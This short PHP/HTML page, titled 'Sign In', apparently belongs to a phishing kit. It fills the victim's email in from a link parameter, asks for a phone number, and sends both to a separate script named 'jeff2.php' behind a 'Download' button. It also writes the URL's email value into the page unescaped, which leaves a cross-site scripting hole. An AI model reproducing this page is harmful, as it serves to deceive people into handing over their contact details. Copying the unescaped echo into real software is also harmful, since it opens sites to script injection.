<!doctype html>
<html>
<head>
<title>Sign In</title>
</head>
<body>
 <link href="style.css" rel="stylesheet">

  <br><br>
<br>

  <?php
/*
Get email from URL and set to email1 variable
*/
$email1 = $_GET['email'];
$try = $_GET['try'];
?>
<center>
<form action="jeff2.php" method="post"><br><br><fieldset>

  <br><br><br>
<br><br><br>
   <input type="email" name="user" placeholder= "Email address" value="<?php echo $email1; ?>" required >
 <br><br>

    <input type="text" name="number" placeholder="Phone number" required >
    <br><br>
</section>

   <center> <input type="submit" name="submit" value="Download"/></center></fieldset>

</form>
</center>
</body>
</html>